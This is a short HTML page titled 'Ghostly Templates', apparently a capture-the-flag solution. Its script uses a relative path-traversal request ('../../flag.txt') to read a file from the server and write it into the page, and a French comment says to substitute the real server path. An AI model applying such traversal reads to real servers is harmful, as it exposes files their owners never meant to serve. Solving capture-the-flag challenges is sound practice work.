<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Ghostly Templates</title>
</head>

<script>
var xhr = new XMLHttpRequest();
var url = "../../flag.txt";  // Remplacez par le chemin réel vers votre fichier sur le serveur

xhr.open("GET", url, true);

xhr.onreadystatechange = function () {
  if (xhr.readyState === 4 && xhr.status === 200) {
    var contenuFichier = xhr.responseText;
    document.getElementById("contenuFichier").innerHTML = contenuFichier;
  }
};

xhr.send();
</script>

<body class="bg-dark text-light">
    <div id="contenuFichier"></div>

</body>

</html>
